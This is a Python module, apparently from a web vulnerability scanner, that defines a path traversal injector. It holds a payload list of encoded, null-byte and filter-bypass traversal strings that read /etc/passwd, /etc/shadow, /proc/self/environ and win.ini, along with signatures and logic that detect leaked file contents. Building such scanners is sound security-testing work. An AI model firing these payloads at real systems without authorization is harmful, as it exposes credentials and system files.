import re
from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class PathTraversalInjector(BaseInjector):
    """Path/directory traversal testing — Unix and Windows file inclusion."""

    name = "traversal"
    description = "Tests for path traversal and local file inclusion vulnerabilities"

    # Known file content signatures (pattern, file description)
    FILE_SIGNATURES = [
        # /etc/passwd
        (r"root:.*:0:0:", "/etc/passwd content"),
        (r"daemon:.*:\d+:\d+:", "/etc/passwd content"),
        (r"nobody:.*:\d+:\d+:", "/etc/passwd content"),
        # /etc/shadow (unlikely but high severity)
        (r"root:\$[0-9a-z]+\$", "/etc/shadow content (critical)"),
        # /etc/hostname
        (r"^[a-zA-Z0-9][a-zA-Z0-9\-]*$", None),  # too generic — only as supporting evidence
        # Windows win.ini
        (r"\[fonts\]", "win.ini [fonts] section"),
        (r"\[extensions\]", "win.ini [extensions] section"),
        (r"\[mci extensions\]", "win.ini content"),
        # Windows system.ini
        (r"\[drivers\]", "system.ini [drivers] section"),
        # /proc/self/environ
        (r"PATH=.*:", "/proc/self/environ leaked"),
        (r"HOME=/", "/proc/self/environ leaked"),
        (r"USER=", "/proc/self/environ leaked"),
        # boot.ini (legacy Windows)
        (r"\[boot loader\]", "boot.ini content"),
        (r"multi\(0\)disk\(0\)", "boot.ini content"),
        # Generic directory listing
        (r"Index of /", "Directory listing exposed"),
    ]

    # Error patterns suggesting path processing occurred
    ERROR_PATTERNS = [
        r"FileNotFoundException",
        r"java\.io\.FileNotFoundException",
        r"No such file or directory",
        r"failed to open stream",
        r"include\(\.\./",
        r"require\(\.\./",
        r"fopen\(",
        r"open_basedir restriction",
        r"Permission denied",
        r"Access is denied",
        r"System\.IO\.",
        r"The system cannot find the (file|path)",
        r"Not a directory",
        r"Is a directory",
    ]

    def generate_quick_payloads(self, context: dict) -> list[str]:
        return [
            "../../../../../../../../etc/passwd",    # deep Unix traversal
            "..\\..\\..\\..\\..\\windows\\win.ini",  # Windows traversal
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL-encoded
        ]

    def generate_payloads(self, context: dict) -> list[str]:
        return [
            # ── Basic Unix traversal to /etc/passwd ──
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",

            # ── Basic Windows traversal ──
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\windows\\win.ini",

            # ── URL-encoded variants ──
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",

            # ── Double-encoding ──
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",

            # ── Null byte (works on older runtimes) ──
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.html",

            # ── Absolute paths (direct file read) ──
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "C:\\windows\\win.ini",
            "C:\\windows\\system.ini",

            # ── Filter bypass: doubled separators ──
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",

            # ── Tomcat/Java normalization bypass ──
            "..;/..;/..;/etc/passwd",

            # ── Mixed slashes ──
            "..\\../..\\../etc/passwd",
            "../..\\../..\\/etc/passwd",

            # ── Other interesting files (Unix) ──
            "../../../etc/hosts",
            "../../../proc/version",
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str,
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "")
        baseline_body = baseline.get("body", "")
        test_status = test_response.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)
        body_len = len(body)
        baseline_len = len(baseline_body)

        # 1. Known file content signatures
        for pattern, desc in self.FILE_SIGNATURES:
            if desc is None:
                continue  # skip generic patterns
            if re.search(pattern, body, re.IGNORECASE | re.MULTILINE):
                if not re.search(pattern, baseline_body, re.IGNORECASE | re.MULTILINE):
                    evidence.append(f"File content detected: {desc}")
                    is_vulnerable = True
                    confidence = "high"

        # 2. Response significantly larger (file content included)
        if test_status == 200 and baseline_status == 200:
            if body_len > baseline_len + 200 and body != baseline_body:
                # Only flag if we also see something suspicious
                if not evidence:
                    evidence.append(
                        f"Response {body_len - baseline_len} bytes larger than baseline"
                    )

        # 3. Content-type changed (server returned raw file)
        test_ct = test_response.get("headers", {}).get("content-type", "")
        baseline_ct = baseline.get("headers", {}).get("content-type", "")
        if test_ct and baseline_ct:
            # Baseline was JSON/HTML, test returned plaintext/octet-stream
            if ("json" in baseline_ct or "html" in baseline_ct) and (
                "octet-stream" in test_ct or "text/plain" in test_ct
            ):
                evidence.append(
                    f"Content-type changed: {baseline_ct} → {test_ct}"
                )
                if not is_vulnerable:
                    is_vulnerable = True
                    confidence = "medium"

        # 4. File-related error patterns
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(f"File error pattern: {pattern}")
                    if not is_vulnerable:
                        is_vulnerable = True
                        confidence = "medium"

        # 5. Directory listing detected
        if re.search(r"Index of /", body) and not re.search(r"Index of /", baseline_body):
            evidence.append("Directory listing exposed")
            is_vulnerable = True
            confidence = "high"

        # 6. Server error triggered
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "low"

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "No indicators found",
            evidence=evidence,
        )
